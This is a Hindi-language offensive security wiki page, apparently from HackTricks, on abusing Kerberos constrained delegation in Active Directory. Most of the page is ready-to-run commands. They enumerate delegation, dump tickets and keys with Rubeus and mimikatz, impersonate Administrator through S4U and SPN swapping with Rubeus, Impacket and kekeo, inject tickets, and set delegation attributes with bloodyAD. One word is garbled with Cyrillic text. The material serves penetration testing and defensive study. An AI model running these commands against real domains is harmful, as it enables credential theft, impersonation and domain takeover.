# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

इसे इस्तेमाल करके एक Domain admin किसी कंप्यूटर को किसी मशीन की किसी भी **service** के खिलाफ किसी **user या computer** का **impersonate** करने की **अनुमति** दे सकता है।

- **Service for User to self (_S4U2self_):** यदि किसी **service account** का _userAccountControl_ मान [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) को दर्शाता है, तो वह किसी भी अन्य user की ओर से स्वयं (सर्विस) के लिए एक TGS प्राप्त कर सकता है।
- **Service for User to Proxy(_S4U2proxy_):** एक **service account** msDS-AllowedToDelegateTo में सेट की गई सर्विस के लिए किसी भी user की ओर से TGS प्राप्त कर सकता है। इसके लिए उसे पहले उस user से अपने लिए एक TGS चाहिए होता है, लेकिन वह S4U2self का उपयोग करके वह TGS पहले प्राप्त कर सकता है और फिर दूसरा अनुरोध कर सकता है।

**Note**: यदि किसी user को AD में ‘_Account is sensitive and cannot be delegated_ ’ के रूप में मार्क किया गया है, तो आप उन्हें **impersonate** नहीं कर पाएंगे।

इसका मतलब यह है कि यदि आप किसी **service** के hash को **compromise** कर लेते हैं तो आप **users** का **impersonate** कर सकते हैं और उनके behalf पर किसी भी संकेतित मशीन की किसी भी **service** तक **access** प्राप्त कर सकते हैं (संभवतः **privesc**).

इसके अलावा, आप न केवल उस service तक पहुँचेंगे जिसे user impersonate कर सकता है, बल्कि किसी भी service तक पहुँच प्राप्त कर सकते हैं क्योंकि SPN (requested service name) की जांच नहीं की जा रही है (ticket में यह भाग encrypted/signed नहीं होता)। इसलिए, यदि आपके पास **CIFS service** की पहुँच है तो आप उदाहरण के लिए Rubeus में `/altservice` फ्लैग का उपयोग करके **HOST service** तक भी पहुँच प्राप्त कर सकते हैं। वही SPN swapping कमजोरी **Impacket getST -altservice** और अन्य टूलिंग द्वारा भी злоупयोग की जाती है।

इसके अलावा, **LDAP service access on DC**, DCSync को exploit करने के लिए आवश्यक है।
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

Windows Server 2012/2012 R2 से KDC S4U2Proxy extensions के माध्यम से **constrained delegation across domains/forests** को सपोर्ट करता है। Modern builds (Windows Server 2016–2025) यह व्यवहार बनाए रखते हैं और protocol transition को संकेत करने के लिए दो PAC SIDs जोड़ते हैं:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) जब उपयोगकर्ता सामान्य रूप से authenticated हुआ हो।
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) जब किसी service ने protocol transition के माध्यम से identity का दावा किया हो।

जब domains के पार protocol transition का उपयोग किया जाता है तो PAC के अंदर `SERVICE_ASSERTED_IDENTITY` की उम्मीद करें, जो पुष्टि करता है कि S4U2Proxy चरण सफल रहा।

### Impacket / Linux tooling (altservice & full S4U)

हाल की Impacket (0.11.x+) Rubeus जैसा ही S4U chain और SPN swapping को expose करती है:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
यदि आप पहले user ST को forging करना पसंद करते हैं (e.g., offline hash only), तो S4U2Proxy के लिए **ticketer.py** को **getST.py** के साथ जोड़ें। वर्तमान quirks के लिए खुले Impacket issue #1713 को देखें (KRB_AP_ERR_MODIFIED जब the forged ST SPN key से मेल नहीं खाता)।

### low-priv creds से delegation setup को स्वचालित करना

यदि आपके पास पहले से किसी कंप्यूटर या service account पर **GenericAll/WriteDACL** है, तो आप आवश्यक attributes को RSAT के बिना दूर से **bloodyAD** (2024+) का उपयोग करके push कर सकते हैं:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
यह आपको उन एट्रिब्यूट्स को लिखने में सक्षम होते ही DA privileges के बिना privesc के लिए एक constrained delegation path बनाने की अनुमति देता है।

- कदम 1: **अनुमत सेवा का TGT प्राप्त करें**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> कंप्यूटर में SYSTEM बने बिना TGT ticket या RC4 या AES256 प्राप्त करने के और भी तरीके हैं, जैसे Printer Bug, unconstrain delegation, NTLM relaying और Active Directory Certificate Service abuse
>
> **सिर्फ उस TGT ticket (या hashed) के पास होने पर आप पूरे कंप्यूटर को compromise किए बिना यह हमला कर सकते हैं।**

- Step2: **user का impersonate करते हुए सेवा के लिए TGS प्राप्त करें**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.team पर अधिक जानकारी।**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) और [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## संदर्भ
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
